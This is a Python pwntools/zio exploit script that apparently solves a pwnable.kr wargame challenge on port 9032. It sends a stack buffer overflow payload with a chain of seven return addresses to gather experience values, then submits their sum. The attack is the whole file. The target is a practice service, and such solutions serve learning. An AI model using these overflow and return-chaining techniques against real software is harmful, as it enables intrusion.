from pwn import *
from zio3 import *
p = zio(('pwnable.kr', 9032))
p.recvuntil('Menu:')
p.sendline('1')
p.recvuntil('earned? : ')
payload = b'a'*(0x74+4)
payload += p32(0x809FE4B)+p32(0x809FE6A)+p32(0x809FE89)+p32(0x809FEA8)+p32(0x809FEC7)+p32(0x809FEE6)+p32(0x809FF05)
payload += p32(0x0809FFFC)
p.sendline(payload)
exp = 0
for i in range(7):
	p.recvuntil('(EXP +')
	exp += int(bytes.decode(p.recvline()).replace(')','').strip())
print(exp)
p.recvuntil('Menu:')
p.sendline('1')
p.recvuntil('earned? : ')
p.sendline(str(exp))
p.recvall()
